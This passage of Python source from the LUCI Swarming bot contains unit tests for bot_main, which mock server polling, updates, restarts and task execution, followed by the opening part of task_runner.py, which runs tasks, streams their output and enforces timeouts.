  def test_bot_call_later_cancel(self):
    obj = bot.Bot(None, {}, 'https://localhost:1/', '1234-1a2b3c4-tainted-joe',
                  'base_dir', None)
    ev = threading.Event()
    obj.call_later(0.1, ev.set)
    obj.cancel_all_timers()
    self.assertFalse(ev.wait(0.3))


if __name__ == '__main__':
  if '-v' in sys.argv:
    unittest.TestCase.maxDiff = None
  unittest.main()
/n/n/n/appengine/swarming/swarming_bot/bot_code/bot_main_test.py/n/n#!/usr/bin/env python
# Copyright 2013 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

import json
import logging
import os
import shutil
import sys
import tempfile
import threading
import time
import unittest
import zipfile

import test_env_bot_code
test_env_bot_code.setup_test_env()

# Creates a server mock for functions in net.py.
import net_utils

import bot_main
import xsrf_client
from api import bot
from api import os_utilities
from depot_tools import fix_encoding
from utils import file_path
from utils import logging_utils
from utils import net
from utils import subprocess42
from utils import zip_package


# Access to a protected member XX of a client class - pylint: disable=W0212


class TestBotMain(net_utils.TestCase):
  maxDiff = 2000

  def setUp(self):
    super(TestBotMain, self).setUp()
    os.environ.pop('SWARMING_LOAD_TEST', None)
    self.root_dir = tempfile.mkdtemp(prefix='bot_main')
    self.old_cwd = os.getcwd()
    os.chdir(self.root_dir)
    # __main__ does it for us.
    os.mkdir('logs')
    self.server = xsrf_client.XsrfRemote('https://localhost:1/')
    self.attributes = {
      'dimensions': {
        'foo': ['bar'],
        'id': ['localhost'],
        'pool': ['default'],
      },
      'state': {
        'cost_usd_hour': 3600.,
      },
      'version': '123',
    }
    self.mock(zip_package, 'generate_version', lambda: '123')
    self.bot = bot.Bot(
        self.server, self.attributes, 'https://localhost:1/', 'version1',
        self.root_dir, self.fail)
    self.mock(self.bot, 'post_error', self.fail)
    self.mock(self.bot, 'restart', self.fail)
    self.mock(subprocess42, 'call', self.fail)
    self.mock(time, 'time', lambda: 100.)
    config_path = os.path.join(
        test_env_bot_code.BOT_DIR, 'config', 'config.json')
    with open(config_path, 'rb') as f:
      config = json.load(f)
    self.mock(bot_main, 'get_config', lambda: config)
    self.mock(
        bot_main, 'THIS_FILE',
        os.path.join(test_env_bot_code.BOT_DIR, 'swarming_bot.zip'))

  def tearDown(self):
    os.environ.pop('SWARMING_BOT_ID', None)
    os.chdir(self.old_cwd)
    file_path.rmtree(self.root_dir)
    super(TestBotMain, self).tearDown()

  def test_get_dimensions(self):
    dimensions = set(bot_main.get_dimensions(None))
    dimensions.discard('hidpi')
    dimensions.discard('zone')  # Only set on GCE bots.
    expected = {'cores', 'cpu', 'gpu', 'id', 'machine_type', 'os', 'pool'}
    self.assertEqual(expected, dimensions)

  def test_get_dimensions_load_test(self):
    os.environ['SWARMING_LOAD_TEST'] = '1'
    self.assertEqual(['id', 'load_test'], sorted(bot_main.get_dimensions(None)))

  def test_generate_version(self):
    self.assertEqual('123', bot_main.generate_version())

  def test_get_state(self):
    self.mock(time, 'time', lambda: 126.0)
    expected = os_utilities.get_state()
    expected['sleep_streak'] = 12
    # During the execution of this test case, the free disk space could have
    # changed.
    for disk in expected['disks'].itervalues():
      self.assertGreater(disk.pop('free_mb'), 1.)
    actual = bot_main.get_state(None, 12)
    for disk in actual['disks'].itervalues():
      self.assertGreater(disk.pop('free_mb'), 1.)
    self.assertGreater(actual.pop('nb_files_in_temp'), 0)
    self.assertGreater(expected.pop('nb_files_in_temp'), 0)
    self.assertGreater(actual.pop('uptime'), 0)
    self.assertGreater(expected.pop('uptime'), 0)
    self.assertEqual(sorted(expected.pop('temp', {})),
                     sorted(actual.pop('temp', {})))
    self.assertEqual(expected, actual)

  def test_setup_bot(self):
    self.mock(bot_main, 'get_remote', lambda: self.server)
    setup_bots = []
    def setup_bot(_bot):
      setup_bots.append(1)
      return False
    from config import bot_config
    self.mock(bot_config, 'setup_bot', setup_bot)
    restarts = []
    post_event = []
    self.mock(
        os_utilities, 'restart', lambda *a, **kw: restarts.append((a, kw)))
    self.mock(
        bot.Bot, 'post_event', lambda *a, **kw: post_event.append((a, kw)))
    self.expected_requests([])
    bot_main.setup_bot(False)
    expected = [
      (('Starting new swarming bot: %s' % bot_main.THIS_FILE,),
        {'timeout': 900}),
    ]
    self.assertEqual(expected, restarts)
    # It is called twice, one as part of setup_bot(False), another as part of
    # on_shutdown_hook().
    self.assertEqual([1, 1], setup_bots)
    expected = [
      'Starting new swarming bot: %s' % bot_main.THIS_FILE,
      'Bot is stuck restarting for: Starting new swarming bot: %s' %
        bot_main.THIS_FILE,
    ]
    self.assertEqual(expected, [i[0][2] for i in post_event])

  def test_post_error_task(self):
    self.mock(time, 'time', lambda: 126.0)
    self.mock(logging, 'error', lambda *_, **_kw: None)
    self.mock(bot_main, 'get_remote', lambda: self.server)
    # get_state() return value changes over time. Hardcode its value for the
    # duration of this test.
    self.mock(os_utilities, 'get_state', lambda : {'foo': 'bar'})
    expected_attribs = bot_main.get_attributes(None)
    self.expected_requests(
        [
          (
            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',
            {
              'data': expected_attribs,
              'headers': {'X-XSRF-Token-Request': '1'},
            },
            {'xsrf_token': 'token'},
          ),
          (
            'https://localhost:1/swarming/api/v1/bot/task_error/23',
            {
              'data': {
                'id': expected_attribs['dimensions']['id'][0],
                'message': 'error',
                'task_id': 23,
              },
              'headers': {'X-XSRF-Token': 'token'},
            },
            {},
          ),
        ])
    botobj = bot_main.get_bot()
    bot_main.post_error_task(botobj, 'error', 23)

  def test_run_bot(self):
    # Test the run_bot() loop. Does not use self.bot.
    self.mock(time, 'time', lambda: 126.0)
    class Foo(Exception):
      pass

    def poll_server(botobj, _):
      sleep_streak = botobj.state['sleep_streak']
      self.assertEqual(botobj.remote, self.server)
      if sleep_streak == 5:
        raise Exception('Jumping out of the loop')
      return False
    self.mock(bot_main, 'poll_server', poll_server)

    def post_error(botobj, e):
      self.assertEqual(self.server, botobj._remote)
      lines = e.splitlines()
      self.assertEqual('Jumping out of the loop', lines[0])
      self.assertEqual('Traceback (most recent call last):', lines[1])
      raise Foo('Necessary to get out of the loop')
    self.mock(bot.Bot, 'post_error', post_error)

    self.mock(bot_main, 'get_remote', lambda: self.server)

    # Method should have ""self"" as first argument - pylint: disable=E0213
    # pylint: disable=unused-argument
    class Popen(object):
      def __init__(
          self2, cmd, detached, cwd, stdout, stderr, stdin, close_fds):
        self2.returncode = None
        expected = [sys.executable, bot_main.THIS_FILE, 'run_isolated']
        self.assertEqual(expected, cmd[:len(expected)])
        self.assertEqual(True, detached)
        self.assertEqual(subprocess42.PIPE, stdout)
        self.assertEqual(subprocess42.STDOUT, stderr)
        self.assertEqual(subprocess42.PIPE, stdin)
        self.assertEqual(sys.platform != 'win32', close_fds)

      def communicate(self2, i):
        self.assertEqual(None, i)
        self2.returncode = 0
        return '', None
    self.mock(subprocess42, 'Popen', Popen)

    self.expected_requests(
        [
          (
            'https://localhost:1/swarming/api/v1/bot/server_ping',
            {}, 'foo', None,
          ),
        ])

    with self.assertRaises(Foo):
      bot_main.run_bot(None)
    self.assertEqual(
        os_utilities.get_hostname_short(), os.environ['SWARMING_BOT_ID'])

  def test_poll_server_sleep(self):
    slept = []
    bit = threading.Event()
    self.mock(bit, 'wait', slept.append)
    self.mock(bot_main, 'run_manifest', self.fail)
    self.mock(bot_main, 'update_bot', self.fail)

    self.expected_requests(
        [
          (
            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',
            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},
            {'xsrf_token': 'token'},
          ),
          (
            'https://localhost:1/swarming/api/v1/bot/poll',
            {
              'data': self.attributes,
              'headers': {'X-XSRF-Token': 'token'},
            },
            {
              'cmd': 'sleep',
              'duration': 1.24,
            },
          ),
        ])
    self.assertFalse(bot_main.poll_server(self.bot, bit))
    self.assertEqual([1.24], slept)

  def test_poll_server_run(self):
    manifest = []
    bit = threading.Event()
    self.mock(bit, 'wait', self.fail)
    self.mock(bot_main, 'run_manifest', lambda *args: manifest.append(args))
    self.mock(bot_main, 'update_bot', self.fail)

    self.expected_requests(
        [
          (
            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',
            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},
            {'xsrf_token': 'token'},
          ),
          (
            'https://localhost:1/swarming/api/v1/bot/poll',
            {
              'data': self.bot._attributes,
              'headers': {'X-XSRF-Token': 'token'},
            },
            {
              'cmd': 'run',
              'manifest': {'foo': 'bar'},
            },
          ),
        ])
    self.assertTrue(bot_main.poll_server(self.bot, bit))
    expected = [(self.bot, {'foo': 'bar'}, time.time())]
    self.assertEqual(expected, manifest)

  def test_poll_server_update(self):
    update = []
    bit = threading.Event()
    self.mock(bit, 'wait', self.fail)
    self.mock(bot_main, 'run_manifest', self.fail)
    self.mock(bot_main, 'update_bot', lambda *args: update.append(args))

    self.expected_requests(
        [
          (
            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',
            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},
            {'xsrf_token': 'token'},
          ),
          (
            'https://localhost:1/swarming/api/v1/bot/poll',
            {
              'data': self.attributes,
              'headers': {'X-XSRF-Token': 'token'},
            },
            {
              'cmd': 'update',
              'version': '123',
            },
          ),
        ])
    self.assertTrue(bot_main.poll_server(self.bot, bit))
    self.assertEqual([(self.bot, '123')], update)

  def test_poll_server_restart(self):
    restart = []
    bit = threading.Event()
    self.mock(bit, 'wait', self.fail)
    self.mock(bot_main, 'run_manifest', self.fail)
    self.mock(bot_main, 'update_bot', self.fail)
    self.mock(self.bot, 'restart', lambda *args: restart.append(args))

    self.expected_requests(
        [
          (
            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',
            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},
            {'xsrf_token': 'token'},
          ),
          (
            'https://localhost:1/swarming/api/v1/bot/poll',
            {
              'data': self.attributes,
              'headers': {'X-XSRF-Token': 'token'},
            },
            {
              'cmd': 'restart',
              'message': 'Please die now',
            },
          ),
        ])
    self.assertTrue(bot_main.poll_server(self.bot, bit))
    self.assertEqual([('Please die now',)], restart)

  def test_poll_server_restart_load_test(self):
    os.environ['SWARMING_LOAD_TEST'] = '1'
    bit = threading.Event()
    self.mock(bit, 'wait', self.fail)
    self.mock(bot_main, 'run_manifest', self.fail)
    self.mock(bot_main, 'update_bot', self.fail)
    self.mock(self.bot, 'restart', self.fail)

    self.expected_requests(
        [
          (
            'https://localhost:1/auth/api/v1/accounts/self/xsrf_token',
            {'data': {}, 'headers': {'X-XSRF-Token-Request': '1'}},
            {'xsrf_token': 'token'},
          ),
          (
            'https://localhost:1/swarming/api/v1/bot/poll',
            {
              'data': self.attributes,
              'headers': {'X-XSRF-Token': 'token'},
            },
            {
              'cmd': 'restart',
              'message': 'Please die now',
            },
          ),
        ])
    self.assertTrue(bot_main.poll_server(self.bot, bit))

  def _mock_popen(self, returncode=0, exit_code=0, url='https://localhost:1'):
    result = {
      'exit_code': exit_code,
      'must_signal_internal_failure': None,
      'version': 3,
    }
    # Method should have ""self"" as first argument - pylint: disable=E0213
    class Popen(object):
      def __init__(
          self2, cmd, detached, cwd, env, stdout, stderr, stdin, close_fds):
        self2.returncode = None
        self2._out_file = os.path.join(
            self.root_dir, 'work', 'task_runner_out.json')
        expected = [
          sys.executable, bot_main.THIS_FILE, 'task_runner',
          '--swarming-server', url,
          '--in-file',
          os.path.join(self.root_dir, 'work', 'task_runner_in.json'),
          '--out-file', self2._out_file,
          '--cost-usd-hour', '3600.0', '--start', '100.0',
          '--min-free-space',
          str(int(
            (os_utilities.get_min_free_space(bot_main.THIS_FILE) + 250.) *
            1024 * 1024)),
        ]
        self.assertEqual(expected, cmd)
        self.assertEqual(True, detached)
        self.assertEqual(self.bot.base_dir, cwd)
        self.assertEqual('24', env['SWARMING_TASK_ID'])
        self.assertTrue(stdout)
        self.assertEqual(subprocess42.STDOUT, stderr)
        self.assertEqual(subprocess42.PIPE, stdin)
        self.assertEqual(sys.platform != 'win32', close_fds)

      def wait(self2, timeout=None): # pylint: disable=unused-argument
        self2.returncode = returncode
        with open(self2._out_file, 'wb') as f:
          json.dump(result, f)
        return 0

    self.mock(subprocess42, 'Popen', Popen)
    return result

  def test_run_manifest(self):
    self.mock(bot_main, 'post_error_task', lambda *args: self.fail(args))
    def call_hook(botobj, name, *args):
      if name == 'on_after_task':
        failure, internal_failure, dimensions, summary = args
        self.assertEqual(self.attributes['dimensions'], botobj.dimensions)
        self.assertEqual(False, failure)
        self.assertEqual(False, internal_failure)
        self.assertEqual({'os': 'Amiga', 'pool': 'default'}, dimensions)
        self.assertEqual(result, summary)
    self.mock(bot_main, 'call_hook', call_hook)
    result = self._mock_popen(url='https://localhost:3')

    manifest = {
      'command': ['echo', 'hi'],
      'dimensions': {'os': 'Amiga', 'pool': 'default'},
      'grace_period': 30,
      'hard_timeout': 60,
      'host': 'https://localhost:3',
      'task_id': '24',
    }
    self.assertEqual(self.root_dir, self.bot.base_dir)
    bot_main.run_manifest(self.bot, manifest, time.time())

  def test_run_manifest_task_failure(self):
    self.mock(bot_main, 'post_error_task', lambda *args: self.fail(args))
    def call_hook(_botobj, name, *args):
      if name == 'on_after_task':
        failure, internal_failure, dimensions, summary = args
        self.assertEqual(True, failure)
        self.assertEqual(False, internal_failure)
        self.assertEqual({'pool': 'default'}, dimensions)
        self.assertEqual(result, summary)
    self.mock(bot_main, 'call_hook', call_hook)
    result = self._mock_popen(exit_code=1)

    manifest = {
      'command': ['echo', 'hi'],
      'dimensions': {'pool': 'default'},
      'grace_period': 30,
      'hard_timeout': 60,
      'io_timeout': 60,
      'task_id': '24',
    }
    bot_main.run_manifest(self.bot, manifest, time.time())

  def test_run_manifest_internal_failure(self):
    posted = []
    self.mock(bot_main, 'post_error_task', lambda *args: posted.append(args))
    def call_hook(_botobj, name, *args):
      if name == 'on_after_task':
        failure, internal_failure, dimensions, summary = args
        self.assertEqual(False, failure)
        self.assertEqual(True, internal_failure)
        self.assertEqual({'pool': 'default'}, dimensions)
        self.assertEqual(result, summary)
    self.mock(bot_main, 'call_hook', call_hook)
    result = self._mock_popen(returncode=1)

    manifest = {
      'command': ['echo', 'hi'],
      'dimensions': {'pool': 'default'},
      'grace_period': 30,
      'hard_timeout': 60,
      'io_timeout': 60,
      'task_id': '24',
    }
    bot_main.run_manifest(self.bot, manifest, time.time())
    expected = [(self.bot, 'Execution failed: internal error (1).', '24')]
    self.assertEqual(expected, posted)

  def test_run_manifest_exception(self):
    posted = []
    def post_error_task(botobj, msg, task_id):
      posted.append((botobj, msg.splitlines()[0], task_id))
    self.mock(bot_main, 'post_error_task', post_error_task)
    def call_hook(_botobj, name, *args):
      if name == 'on_after_task':
        failure, internal_failure, dimensions, summary = args
        self.assertEqual(False, failure)
        self.assertEqual(True, internal_failure)
        self.assertEqual({'pool': 'default'}, dimensions)
        self.assertEqual({}, summary)
    self.mock(bot_main, 'call_hook', call_hook)
    def raiseOSError(*_a, **_k):
      raise OSError('Dang')
    self.mock(subprocess42, 'Popen', raiseOSError)

    manifest = {
      'command': ['echo', 'hi'],
      'dimensions': {'pool': 'default'},
      'grace_period': 30,
      'hard_timeout': 60,
      'task_id': '24',
    }
    bot_main.run_manifest(self.bot, manifest, time.time())
    expected = [(self.bot, 'Internal exception occured: Dang', '24')]
    self.assertEqual(expected, posted)

  def test_update_bot(self):
    # In a real case 'update_bot' never exits and doesn't call 'post_error'.
    # Under the test however forever-blocking calls finish, and post_error is
    # called.
    self.mock(self.bot, 'post_error', lambda *_: None)
    # Mock the file to download in the temporary directory.
    self.mock(
        bot_main, 'THIS_FILE',
        os.path.join(self.root_dir, 'swarming_bot.1.zip'))
    new_zip = os.path.join(self.root_dir, 'swarming_bot.2.zip')
    # This is necessary otherwise zipfile will crash.
    self.mock(time, 'time', lambda: 1400000000)
    def url_retrieve(f, url):
      self.assertEqual(
          'https://localhost:1/swarming/api/v1/bot/bot_code/123', url)
      self.assertEqual(new_zip, f)
      # Create a valid zip that runs properly.
      with zipfile.ZipFile(f, 'w') as z:
        z.writestr('__main__.py', 'print(""hi"")')
      return True
    self.mock(net, 'url_retrieve', url_retrieve)

    calls = []
    def exec_python(args):
      calls.append(args)
      return 23
    self.mock(bot_main.common, 'exec_python', exec_python)

    with self.assertRaises(SystemExit) as e:
      bot_main.update_bot(self.bot, '123')
    self.assertEqual(23, e.exception.code)

    self.assertEqual([[new_zip, 'start_slave', '--survive']], calls)

  def test_main(self):
    def check(x):
      self.assertEqual(logging.WARNING, x)
    self.mock(logging_utils, 'set_console_level', check)

    def run_bot(error):
      self.assertEqual(None, error)
      return 0
    self.mock(bot_main, 'run_bot', run_bot)

    class Singleton(object):
      # pylint: disable=no-self-argument
      def acquire(self2):
        return True
      def release(self2):
        self.fail()
    self.mock(bot_main, 'SINGLETON', Singleton())

    self.assertEqual(0, bot_main.main([]))


if __name__ == '__main__':
  fix_encoding.fix_encoding()
  if '-v' in sys.argv:
    unittest.TestCase.maxDiff = None
  logging.basicConfig(
      level=logging.DEBUG if '-v' in sys.argv else logging.CRITICAL)
  unittest.main()
/n/n/n/appengine/swarming/swarming_bot/bot_code/task_runner.py/n/n# Copyright 2013 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""Runs a Swarming task.

Downloads all the necessary files to run the task, executes the command and
streams results back to the Swarming server.

The process exit code is 0 when the task was executed, even if the task itself
failed. If there's any failure in the setup or teardown, like invalid packet
response, failure to contact the server, etc, a non zero exit code is used. It's
up to the calling process (bot_main.py) to signal that there was an internal
failure and to cancel this task run and ask the server to retry it.
""""""

import base64
import json
import logging
import optparse
import os
import signal
import sys
import time

import xsrf_client
from utils import net
from utils import on_error
from utils import subprocess42
from utils import zip_package


# Path to this file or the zip containing this file.
THIS_FILE = os.path.abspath(zip_package.get_main_script_path())


# Sends a maximum of 100kb of stdout per task_update packet.
MAX_CHUNK_SIZE = 102400


# Maximum wait between task_update packet when there's no output.
MAX_PACKET_INTERVAL = 30


# Minimum wait between task_update packet when there's output.
MIN_PACKET_INTERNAL = 10


# Current task_runner_out version.
OUT_VERSION = 3


# On Windows, SIGTERM is actually sent as SIGBREAK since there's no real
# SIGTERM.  SIGBREAK is not defined on posix since it's a pure Windows concept.
SIG_BREAK_OR_TERM = (
    signal.SIGBREAK if sys.platform == 'win32' else signal.SIGTERM)


# Used to implement monotonic_time for a clock that never goes backward.
_last_now = 0


def monotonic_time():
  """"""Returns monotonically increasing time.""""""
  global _last_now
  now = time.time()
  if now > _last_now:
    # TODO(maruel): If delta is large, probably worth alerting via ereporter2.
    _last_now = now
  return _last_now


def get_run_isolated():
  """"""Returns the path to itself to run run_isolated.

  Mocked in test to point to the real run_isolated.py script.
  """"""
  return [sys.executable, THIS_FILE, 'run_isolated']


def get_isolated_cmd(
    work_dir, task_details, isolated_result, min_free_space):
  """"""Returns the command to call run_isolated. Mocked in tests.""""""
  bot_dir = os.path.dirname(work_dir)
  if os.path.isfile(isolated_result):
    os.remove(isolated_result)
  cmd = get_run_isolated()
  cmd.extend(
      [
        '--isolated', task_details.inputs_ref['isolated'].encode('utf-8'),
        '--namespace', task_details.inputs_ref['namespace'].encode('utf-8'),
        '-I', task_details.inputs_ref['isolatedserver'].encode('utf-8'),
        '--json', isolated_result,
        '--log-file', os.path.join(bot_dir, 'logs', 'run_isolated.log'),
        '--cache', os.path.join(bot_dir, 'cache'),
        '--root-dir', os.path.join(work_dir, 'isolated'),
      ])
  if min_free_space:
    cmd.extend(('--min-free-space', str(min_free_space)))

  if task_details.hard_timeout:
    cmd.extend(('--hard-timeout', str(task_details.hard_timeout)))
  if task_details.grace_period:
    cmd.extend(('--grace-period', str(task_details.grace_period)))
  if task_details.extra_args:
    cmd.append('--')
    cmd.extend(task_details.extra_args)
  return cmd


class TaskDetails(object):
  def __init__(self, data):
    """"""Loads the raw data.

    It is expected to have at least:
     - bot_id
     - command as a list of str
     - data as a list of urls
     - env as a dict
     - hard_timeout
     - io_timeout
     - task_id
    """"""
    logging.info('TaskDetails(%s)', data)
    if not isinstance(data, dict):
      raise ValueError('Expected dict, got %r' % data)

    # Get all the data first so it fails early if the task details is invalid.
    self.bot_id = data['bot_id']

    # Raw command. Only self.command or self.inputs_ref can be set.
    self.command = data['command'] or []

    # Isolated command. Is a serialized version of task_request.FilesRef.
    self.inputs_ref = data['inputs_ref']
    self.extra_args = data['extra_args']

    self.env = {
      k.encode('utf-8'): v.encode('utf-8') for k, v in data['env'].iteritems()
    }
    self.grace_period = data['grace_period']
    self.hard_timeout = data['hard_timeout']
    self.io_timeout = data['io_timeout']
    self.task_id = data['task_id']


class MustExit(Exception):
  """"""Raised on signal that the process must exit immediately.""""""
  def __init__(self, sig):
    super(MustExit, self).__init__()
    self.signal = sig


def load_and_run(
    in_file, swarming_server, cost_usd_hour, start, out_file, min_free_space):
  """"""Loads the task's metadata and execute it.

  This may throw all sorts of exceptions in case of failure. It's up to the
  caller to trap them. These shall be considered 'internal_failure' instead of
  'failure' from a TaskRunResult standpoint.
  """"""
  # The work directory is guaranteed to exist since it was created by
  # bot_main.py and contains the manifest. Temporary files will be downloaded
  # there. It's bot_main.py that will delete the directory afterward. Tests are
  # not run from there.
  task_result = None
  def handler(sig, _):
    logging.info('Got signal %s', sig)
    raise MustExit(sig)
  work_dir = os.path.dirname(out_file)
  try:
    with subprocess42.set_signal_handler([SIG_BREAK_OR_TERM], handler):
      if not os.path.isdir(work_dir):
        raise ValueError('%s expected to exist' % work_dir)

      with open(in_file, 'rb') as f:
        task_details = TaskDetails(json.load(f))

      task_result = run_command(
          swarming_server, task_details, work_dir, cost_usd_hour, start,
          min_free_space)
  except MustExit as e:
    # This normally means run_command() didn't get the chance to run, as it
    # itself trap MustExit and will report accordingly. In this case, we want
    # the parent process to send the message instead.
    if not task_result:
      task_result = {
        u'exit_code': None,
        u'hard_timeout': False,
        u'io_timeout': False,
        u'must_signal_internal_failure':
            u'task_runner received signal %s' % e.signal,
        u'version': OUT_VERSION,
      }
  finally:
    # We've found tests to delete 'work' when quitting, causing an exception
    # here. Try to recreate the directory if necessary.
    if not os.path.isdir(work_dir):
      os.mkdir(work_dir)
    with open(out_file, 'wb') as f:
      json.dump(task_result, f)


def post_update(swarming_server, params, exit_code, stdout, output_chunk_start):
  """"""Posts task update to task_update.

  Arguments:
    swarming_server: XsrfRemote instance.
    params: Default JSON parameters for the POST.
    exit_code: Process exit code, only when a command completed.
    stdout: Incremental output since last call, if any.
    output_chunk_start: Total number of stdout previously sent, for coherency
        with the server.
  """"""
  params = params.copy()
  if exit_code is not None:
    params['exit_code'] = exit_code
  if stdout:
    # The output_chunk_start is used by the server to make sure that the stdout
    # chunks are processed and saved in the DB in order.
    params['output'] = base64.b64encode(stdout)
    params['output_chunk_start'] = output_chunk_start
  # TODO(maruel): Support early cancellation.
  # https://code.google.com/p/swarming/issues/detail?id=62
  resp = swarming_server.url_read_json(
      '/swarming/api/v1/bot/task_update/%s' % params['task_id'], data=params)
  logging.debug('post_update() = %s', resp)
  if resp.get('error'):
    # Abandon it. This will force a process exit.
    raise ValueError(resp.get('error'))


def should_post_update(stdout, now, last_packet):
  """"""Returns True if it's time to send a task_update packet via post_update().

  Sends a packet when one of this condition is met:
  - more than MAX_CHUNK_SIZE of stdout is buffered.
  - last packet was sent more than MIN_PACKET_INTERNAL seconds ago and there was
    stdout.
  - last packet was sent more than MAX_PACKET_INTERVAL seconds ago.
  """"""
  packet_interval = MIN_PACKET_INTERNAL if stdout else MAX_PACKET_INTERVAL
  return len(stdout) >= MAX_CHUNK_SIZE or (now - last_packet) > packet_interval


def calc_yield_wait(task_details, start, last_io, timed_out, stdout):
  """"""Calculates the maximum number of seconds to wait in yield_any().""""""
  now = monotonic_time()
  if timed_out:
    # Give a |grace_period| seconds delay.
    if task_details.grace_period:
      return max(now - timed_out - task_details.grace_period, 0.)
    return 0.

  out = MIN_PACKET_INTERNAL if stdout else MAX_PACKET_INTERVAL
  if task_details.hard_timeout:
    out = min(out, start + task_details.hard_timeout - now)
  if task_details.io_timeout:
    out = min(out, last_io + task_details.io_timeout - now)
  out = max(out, 0)
  logging.debug('calc_yield_wait() = %d', out)
  return out


def kill_and_wait(proc, grace_period, reason):
  logging.warning('SIGTERM finally due to %s', reason)
  proc.terminate()
  try:
    proc.wait(grace_period)
  except subprocess42.TimeoutError:
    logging.warning('SIGKILL finally due to %s', reason)
    proc.kill()
  exit_code = proc.wait()
  logging.info('Waiting for proces exit in finally - done')
  return exit_code


def run_command(
    swarming_server, task_details, work_dir, cost_usd_hour, task_start,
    min_free_space):
  """"""Runs a command and sends packets to the server to stream results back.

  Implements both I/O and hard timeouts. Sends the packets numbered, so the
  server can ensure they are processed in order.

  Returns:
    Metadata about the command.
  """"""
  # TODO(maruel): This function is incomprehensible, split and refactor.
  # Signal the command is about to be started.
  last_packet = start = now = monotonic_time()
  params = {
    'cost_usd': cost_usd_hour * (now - task_start) / 60. / 60.,
    'id': task_details.bot_id,
    'task_id': task_details.task_id,
  }
  post_update(swarming_server, params, None, '', 0)

  if task_details.command:
    # Raw command.
    cmd = task_details.command
    isolated_result = None
  else:
    # Isolated task.
    isolated_result = os.path.join(work_dir, 'isolated_result.json')
    cmd = get_isolated_cmd(
        work_dir, task_details, isolated_result, min_free_space)
    # Hard timeout enforcement is deferred to run_isolated. Grace is doubled to
    # give one 'grace_period' slot to the child process and one slot to upload
    # the results back.
    task_details.hard_timeout = 0
    if task_details.grace_period:
      task_details.grace_period *= 2

  try:
    # TODO(maruel): Support both channels independently and display stderr in
    # red.
    env = None
    if task_details.env:
      env = os.environ.copy()
      for key, value in task_details.env.iteritems():
        if not value:
          env.pop(key, None)
        else:
          env[key] = value
    logging.info('cmd=%s', cmd)
    logging.info('env=%s', env)
    try:
      proc = subprocess42.Popen(
          cmd,
          env=env,
          cwd=work_dir,
          detached=True,
          stdout=subprocess42.PIPE,
          stderr=subprocess42.STDOUT,
          stdin=subprocess42.PIPE)
    except OSError as e:
      stdout = 'Command ""%s"" failed to start.\nError: %s' % (' '.join(cmd), e)
      now = monotonic_time()
      params['cost_usd'] = cost_usd_hour * (now - task_start) / 60. / 60.
      params['duration'] = now - start
      params['io_timeout'] = False
      params['hard_timeout'] = False
      post_update(swarming_server, params, 1, stdout, 0)
      return {
        u'exit_code': -1,
        u'hard_timeout': False,
        u'io_timeout': False,
        u'must_signal_internal_failure': None,
        u'version': OUT_VERSION,
      }

    output_chunk_start = 0
    stdout = ''
    exit_code = None
    had_hard_timeout = False
    had_io_timeout = False
    must_signal_internal_failure = None
    kill_sent = False
    timed_out = None
    try:
      calc = lambda: calc_yield_wait(
          task_details, start, last_io, timed_out, stdout)
      maxsize = lambda: MAX_CHUNK_SIZE - len(stdout)
      last_io = monotonic_time()
      for _, new_data in proc.yield_any(maxsize=maxsize, timeout=calc):
        now = monotonic_time()
        if new_data:
          stdout += new_data
          last_io = now

        # Post update if necessary.
        if should_post_update(stdout, now, last_packet):
          last_packet = monotonic_time()
          params['cost_usd'] = (
              cost_usd_hour * (last_packet - task_start) / 60. / 60.)
          post_update(swarming_server, params, None, stdout, output_chunk_start)
          output_chunk_start += len(stdout)
          stdout = ''

        # Send signal on timeout if necessary. Both are failures, not
        # internal_failures.
        # Eventually kill but return 0 so bot_main.py doesn't cancel the task.
        if not timed_out:
          if (task_details.io_timeout and
              now - last_io > task_details.io_timeout):
            had_io_timeout = True
            logging.warning('I/O timeout; sending SIGTERM')
            proc.terminate()
            timed_out = monotonic_time()
          elif (task_details.hard_timeout and
              now - start > task_details.hard_timeout):
            had_hard_timeout = True
            logging.warning('Hard timeout; sending SIGTERM')
            proc.terminate()
            timed_out = monotonic_time()
        else:
          # During grace period.
          if not kill_sent and now >= timed_out + task_details.grace_period:
            # Now kill for real. The user can distinguish between the following
            # states:
            # - signal but process exited within grace period,
            #   (hard_|io_)_timed_out will be set but the process exit code will
            #   be script provided.
            # - processed exited late, exit code will be -9 on posix.
            logging.warning('Grace exhausted; sending SIGKILL')
            proc.kill()
            kill_sent = True
      logging.info('Waiting for proces exit')
      exit_code = proc.wait()
    except MustExit as e:
      # TODO(maruel): Do the send SIGTERM to child process and give it
      # task_details.grace_period to terminate.
      must_signal_internal_failure = (
          u'task_runner received signal %s' % e.signal)
      exit_code = kill_and_wait(
          proc, task_details.grace_period, 'signal %d' % e.signal)
    except (IOError, OSError):
      # Something wrong happened, try to kill the child process.
      had_hard_timeout = True
      exit_code = kill_and_wait(
          proc, task_details.grace_period, 'exception %s' % e)

    # This is the very last packet for this command. It if was an isolated task,
    # include the output reference to the archived .isolated file.
    now = monotonic_time()
    params['cost_usd'] = cost_usd_hour * (now - task_start) / 60. / 60.
    params['duration'] = now - start
    params['io_timeout'] = had_io_timeout
    params['hard_timeout'] = had_hard_timeout
    if isolated_result:
      try:
        if ((had_io_timeout or had_hard_timeout) and
            not os.path.isfile(isolated_result)):
          # It's possible that run_isolated failed to quit quickly enough; it
          # could be because there was too much data to upload back or something
          # else. Do not create an internal error, just send back the (partial)
          # view as task_runner saw it, for example the real exit_code is
          # unknown.
          logging.warning('TIMED_OUT and there\'s no result file')
          exit_code = -1
        else:
          # See run_isolated.py for the format.
          with open(isolated_result, 'rb') as f:
            run_isolated_result = json.load(f)
          logging.debug('run_isolated:\n%s', run_isolated_result)
          # TODO(maruel): Grab statistics (cache hit rate, data downloaded,
          # mapping time, etc) from run_isolated and push them to the server.
          if run_isolated_result['outputs_ref']:
            params['outputs_ref'] = run_isolated_result['outputs_ref']
          had_hard_timeout = (
              had_hard_timeout or run_isolated_result['had_hard_timeout'])
